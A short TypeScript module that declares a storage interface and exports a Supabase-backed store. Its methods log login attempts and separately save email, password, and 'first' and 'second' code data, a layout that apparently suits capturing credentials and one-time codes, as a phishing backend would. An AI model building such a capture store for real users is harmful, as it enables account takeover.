import { supabaseStorage } from "./storage-supabase";

export interface IStorage {
  logLoginAttempt(attempt: any): Promise<any>;
  getLoginAttempts(): Promise<any[]>;
  clearLoginAttempts(): Promise<void>;
  saveEmailData(data: any): Promise<void>;
  savePasswordData(data: any): Promise<void>;
  saveFirstCodeData(data: any): Promise<void>;
  saveSecondCodeData(data: any): Promise<void>;
}

// Use Supabase storage by default (with JSON fallback)
export const storage = supabaseStorage;
